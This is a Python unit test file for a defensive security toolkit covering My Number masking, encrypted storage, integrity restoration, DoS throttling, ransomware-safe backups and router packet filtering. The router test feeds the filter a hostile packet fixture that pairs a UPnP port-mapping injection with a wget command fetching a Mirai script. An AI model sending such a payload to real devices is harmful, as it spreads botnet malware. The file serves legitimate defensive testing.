import json
import os
import secrets
import tempfile
import unittest
from pathlib import Path

from aegis.deepseek_advisor import DeepSeekV4FlashAdvisor
from aegis.jp_structural_guard import (
    DataProtectionAndSeparationVault,
    DoSShieldAndLoadBalancer,
    ImmutableRansomwareBackupEngine,
    IntegrityCheckAndSelfHealer,
    JapanStructuralSecuritySolver,
    MyNumberPrivacyShield,
    PathSeparationViolationError,
    RouterAndBadPacketFirewall,
)
from aegis.server import AegisAppState

try:
    from http_harness import request
except ImportError:
    from tests.http_harness import request


class TestJapanStructural6Problems(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp_dir.name)

    def tearDown(self) -> None:
        self.tmp_dir.cleanup()

    def test_1_my_number_card_12digit_check_digit_and_masking(self) -> None:
        shield = MyNumberPrivacyShield()
        valid_mynum = MyNumberPrivacyShield.generate_valid_sample_my_number("12345678901")
        self.assertEqual(len(valid_mynum), 12)
        self.assertTrue(MyNumberPrivacyShield.is_valid_my_number(valid_mynum))

        # Flip last digit -> invalid My Number
        invalid_digit = "0" if valid_mynum[-1] != "0" else "1"
        invalid_mynum = valid_mynum[:11] + invalid_digit
        self.assertFalse(MyNumberPrivacyShield.is_valid_my_number(invalid_mynum))

        # Prompt containing a valid formatted My Number AND a benign 12-digit timestamp
        text = f"申請者の番号は {valid_mynum[:4]}-{valid_mynum[4:8]}-{valid_mynum[8:]} です。受付時刻: 202610201753"
        res = shield.inspect_and_mask(text)
        self.assertFalse(res["safe"])
        self.assertTrue(res["my_number_exposed"])
        self.assertIn("[REDACTED_JP_MYNUMBER_12D]", res["sanitized_text"])
        # Benign timestamp must NOT be corrupted
        self.assertIn("202610201753", res["sanitized_text"])
        self.assertTrue(res["detections"][0]["blind_token"].startswith("mynum://blind-token/"))

        # Verify DeepSeekV4FlashAdvisor pre-flight scrubber also masks 12-digit My Numbers
        scrubbed = DeepSeekV4FlashAdvisor.scrub_payload_for_llm(f"個人番号: {valid_mynum}")
        self.assertIn("[REDACTED_JP_MYNUMBER_12D]", scrubbed)
        self.assertNotIn(valid_mynum, scrubbed)

    def test_2_data_protection_encryption_and_system_separation(self) -> None:
        sys_dir = self.root / "system_app"
        data_dir = self.root / "isolated_data_vault"
        sys_dir.mkdir()
        data_dir.mkdir()

        # Attempting to place data_root inside system_root must be rejected
        with self.assertRaises(PathSeparationViolationError):
            DataProtectionAndSeparationVault(
                system_root=str(sys_dir),
                data_root=str(sys_dir / "nested_data"),
            )

        vault = DataProtectionAndSeparationVault(
            system_root=str(sys_dir),
            data_root=str(data_dir),
        )
        secret_data = "顧客マイナンバー・銀行口座データ: 非公開情報".encode("utf-8")
        meta = vault.encrypt_and_store("customer_001", secret_data)
        self.assertTrue(meta["separated_from_system"])
        self.assertFalse(meta["plaintext_stored_on_disk"])

        # Raw disk file must not contain plaintext
        raw_on_disk = Path(meta["encrypted_path"]).read_text(encoding="utf-8")
        self.assertNotIn("銀行口座", raw_on_disk)

        # Decrypt and verify exact match
        decrypted = vault.load_and_decrypt("customer_001")
        self.assertEqual(decrypted, secret_data)

        # Tampering with ciphertext must trigger HMAC integrity failure
        env = json.loads(raw_on_disk)
        env["ciphertext_hex"] = "ff" + env["ciphertext_hex"][2:]
        Path(meta["encrypted_path"]).write_text(json.dumps(env), encoding="utf-8")
        with self.assertRaises(ValueError):
            vault.load_and_decrypt("customer_001")

    def test_3_integrity_check_and_restore_to_normal_state(self) -> None:
        healer = IntegrityCheckAndSelfHealer(state_dir=str(self.root / "healer_state"))
        cfg_file = self.root / "router_firewall.conf"
        pristine_text = "allow_lan=true\nwan_admin=false\nupnp=false\n"
        cfg_file.write_text(pristine_text, encoding="utf-8")
        os.chmod(cfg_file, 0o600)

        healer.register_baseline([str(cfg_file)])

        # 1. Tamper with file content & permissions
        cfg_file.write_text("wan_admin=true\nhacked_backdoor=1\n", encoding="utf-8")
        os.chmod(cfg_file, 0o777)

        heal_res = healer.check_and_heal(auto_restore=True)
        self.assertFalse(heal_res["integrity_ok"])
        self.assertEqual(heal_res["state_changes_detected"], 1)
        self.assertTrue(heal_res["all_healed_to_normal"])
        self.assertEqual(cfg_file.read_text(encoding="utf-8"), pristine_text)

        # 2. Delete the file completely -> Healer restores it from golden snapshot
        cfg_file.unlink()
        self.assertFalse(cfg_file.exists())
        heal_del = healer.check_and_heal(auto_restore=True)
        self.assertTrue(heal_del["all_healed_to_normal"])
        self.assertTrue(cfg_file.exists())
        self.assertEqual(cfg_file.read_text(encoding="utf-8"), pristine_text)

    def test_4_dos_attack_mitigation_and_load_balancing(self) -> None:
        lb = DoSShieldAndLoadBalancer(rate_limit_per_sec=5.0, burst_capacity=3)

        # Normal requests distribute across nodes via Least-Connections
        r1 = lb.route_request("198.51.100.10", now=100.0)
        r2 = lb.route_request("198.51.100.11", now=100.0)
        r3 = lb.route_request("198.51.100.12", now=100.0)
        self.assertTrue(r1["allowed"] and r2["allowed"] and r3["allowed"])
        assigned_nodes = {r1["assigned_node"], r2["assigned_node"], r3["assigned_node"]}
        self.assertGreaterEqual(len(assigned_nodes), 2)

        # Attacker IP floods > burst_capacity at same timestamp -> Dropped with 429
        attacker_ip = "203.0.113.200"
        for _ in range(3):
            self.assertTrue(lb.route_request(attacker_ip, now=200.0)["allowed"])
        flood_res = lb.route_request(attacker_ip, now=200.0)
        self.assertFalse(flood_res["allowed"])
        self.assertEqual(flood_res["status_code"], 429)
        self.assertEqual(flood_res["action"], "DROP_DOS_FLOOD")

        # Privileged Owner is NEVER blocked even during DoS flood
        owner_res = lb.route_request(attacker_ip, actor_authority="PRIVILEGED_OWNER", now=200.0)
        self.assertTrue(owner_res["allowed"])

    def test_5_ransomware_hourly_daily_immutable_backup_and_recovery(self) -> None:
        backup_engine = ImmutableRansomwareBackupEngine(backup_vault_dir=str(self.root / "backups"))
        work_dir = self.root / "company_docs"
        work_dir.mkdir()
        doc1 = work_dir / "決算書_2026.txt"
        doc2 = work_dir / "顧客台帳.csv"
        doc1.write_text("売上高: 10億円 / 営業利益: 3億円", encoding="utf-8")
        doc2.write_text("id,name\n1,Yamada\n2,Suzuki\n", encoding="utf-8")

        # Create clean HOURLY and DAILY snapshots
        hourly = backup_engine.create_snapshot(str(work_dir), cadence="HOURLY")
        daily = backup_engine.create_snapshot(str(work_dir), cadence="DAILY")
        self.assertTrue(hourly["created"])
        self.assertTrue(daily["created"])

        # Simulate Ransomware Attack: encrypt files with high-entropy random bytes + .locked extension
        doc1.write_bytes(secrets.token_bytes(1024))
        ransom_file = work_dir / "顧客台帳.csv.locked"
        ransom_file.write_bytes(secrets.token_bytes(1024))
        doc2.unlink()

        # Backup engine must detect ransomware encryption and REFUSE to overwrite clean backups
        poisoned_attempt = backup_engine.create_snapshot(str(work_dir), cadence="HOURLY")
        self.assertFalse(poisoned_attempt["created"])
        self.assertTrue(poisoned_attempt["ransomware_poisoning_blocked"])

        # Restore from clean HOURLY snapshot -> removes .locked file and recovers exact documents
        restore_res = backup_engine.restore_snapshot(hourly["snapshot_id"])
        self.assertTrue(restore_res["restored"])
        self.assertFalse(ransom_file.exists())
        self.assertEqual(doc1.read_text(encoding="utf-8"), "売上高: 10億円 / 営業利益: 3億円")
        self.assertEqual(doc2.read_text(encoding="utf-8"), "id,name\n1,Yamada\n2,Suzuki\n")

    def test_6_router_hardening_and_bad_packet_filter(self) -> None:
        fw = RouterAndBadPacketFirewall()

        # 1. Bad packet: TCP Xmas Tree + Bogon IP on WAN + UPnP exploit payload
        bad_pkt = fw.inspect_packet(
            {
                "interface": "wan0",
                "protocol": "TCP",
                "src_ip": "192.168.1.50",
                "dst_ip": "203.0.113.5",
                "dst_port": 1900,
                "tcp_flags": ["FIN", "URG", "PSH"],
                "payload": "SOAPAction: WANIPConnection#AddPortMapping ; wget http://185.220.101.1/mirai.sh",
            }
        )
        self.assertFalse(bad_pkt["allowed"])
        self.assertEqual(bad_pkt["verdict"], "DROP_BAD_PACKET")
        self.assertGreaterEqual(len(bad_pkt["dropped_reasons"]), 3)

        # 2. Clean HTTPS packet -> Allowed
        clean_pkt = fw.inspect_packet(
            {
                "interface": "wan0",
                "protocol": "TCP",
                "src_ip": "198.51.100.25",
                "dst_ip": "203.0.113.5",
                "dst_port": 443,
                "tcp_flags": ["SYN", "ACK"],
                "payload": "TLSv1.3 ClientHello",
            }
        )
        self.assertTrue(clean_pkt["allowed"])
        self.assertEqual(clean_pkt["verdict"], "PASS_CLEAN_PACKET")

        # 3. Router config audit & pf.conf generation
        audit = fw.audit_router_and_generate_firewall_rules()
        self.assertFalse(audit["router_secure"])
        self.assertIn("block drop in quick", audit["generated_pf_firewall_rules"])

    def test_7_server_http_endpoints_for_jp_structural_guard(self) -> None:
        state = AegisAppState()
        headers = {"X-Aegis-Token": state.token}

        code, body = request(state, "GET", "/api/jp-structural-guard", headers=headers)
        self.assertEqual(code, 200)
        data = json.loads(body)
        self.assertEqual(data["version"], "4.1.0-jp-structural-6-pillars")
        self.assertTrue(data["1_my_number_12digit_shield"]["my_number_exposed"])
        self.assertTrue(data["2_data_protection_and_separation"]["separated_from_system"])
        self.assertFalse(data["6_router_and_bad_packet_filter"]["sample_bad_packet_verdict"]["allowed"])


if __name__ == "__main__":
    unittest.main()
